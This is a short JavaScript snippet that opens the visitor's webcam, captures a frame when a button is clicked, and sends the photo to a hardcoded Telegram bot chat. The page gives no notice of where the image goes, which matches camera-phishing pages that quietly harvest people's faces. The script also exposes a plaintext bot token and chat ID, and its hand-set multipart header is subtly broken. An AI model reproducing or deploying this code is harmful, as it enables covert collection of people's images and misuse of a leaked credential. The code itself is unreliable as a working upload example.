


// HTML
// Add an HTML video and button element to capture the photo
const video = document.createElement('video');
const captureButton = document.createElement('button');
captureButton.innerText = 'Capture Photo';
document.body.appendChild(video);
document.body.appendChild(captureButton);

// JavaScript
// Get access to the user's webcam
navigator.mediaDevices.getUserMedia({ video: true })
  .then(stream => {
    video.srcObject = stream;
    video.play();
  })
  .catch(error => {
    console.error('Error accessing the webcam:', error);
  });

// Add an event listener to the capture button
captureButton.addEventListener('click', () => {
  // Create a canvas element
  const canvas = document.createElement('canvas');
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  const context = canvas.getContext('2d');
  context.drawImage(video, 0, 0, canvas.width, canvas.height);

  // Convert the captured photo to a Blob
  canvas.toBlob(blob => {
    // Create a FormData object to send the photo to the server
    const formData = new FormData();
    formData.append('photo', blob, 'photo.jpg');

    // Create a new XMLHttpRequest object
    const xhr = new XMLHttpRequest();

    // Set the request method and URL
    xhr.open('POST', 'https://api.telegram.org/bot6936487434:AAHTB_vkcmvX8phb969ZpJhoUwoe5_Axnhw/sendPhoto', true);

    // Set the request headers
    xhr.setRequestHeader('Content-Type', 'multipart/form-data');

    // Set the request payload
    formData.append('chat_id', '1494753646');
    formData.append('parse_mode', 'HTML');
    xhr.send(formData);

    // Handle the response
    xhr.onload = function() {
      if (xhr.status === 200) {
        console.log('Photo sent successfully');
      } else {
        console.error('Error sending photo:', xhr.status);
      }
    };
  }, 'image/jpeg');
});
